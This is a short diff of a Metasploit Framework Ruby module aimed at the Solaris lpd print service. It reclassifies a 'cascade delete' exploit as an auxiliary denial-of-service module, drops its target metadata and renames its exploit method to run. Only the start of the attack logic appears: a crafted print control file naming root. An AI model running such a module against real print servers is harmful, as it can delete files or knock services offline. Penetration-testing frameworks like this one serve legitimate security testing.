@@ -2,7 +2,7 @@ require 'msf/core'
 
 module Msf
 
-class Exploits::Solaris::Lpd::CascadeDelete < Msf::Exploit::Remote
+class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary
 
 	include Exploit::Remote::Tcp
 
@@ -23,13 +23,8 @@ class Exploits::Solaris::Lpd::CascadeDelete < Msf::Exploit::Remote
 			'References'     =>
 				[
 					[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1'],
-				],
-			'Targets'        => 
-				[
-					['Automatic Target', { }]
-				],
-			'DisclosureDate' => '',
-			'DefaultTarget' => 0))
+				]
+			))
 			
 			register_options(
 				[
@@ -38,7 +33,7 @@ class Exploits::Solaris::Lpd::CascadeDelete < Msf::Exploit::Remote
 				], self.class)
 	end
 
-	def exploit
+	def run
 	
 		# Create a simple control file...
 		control = "Hmetasploit\nPr00t\n";
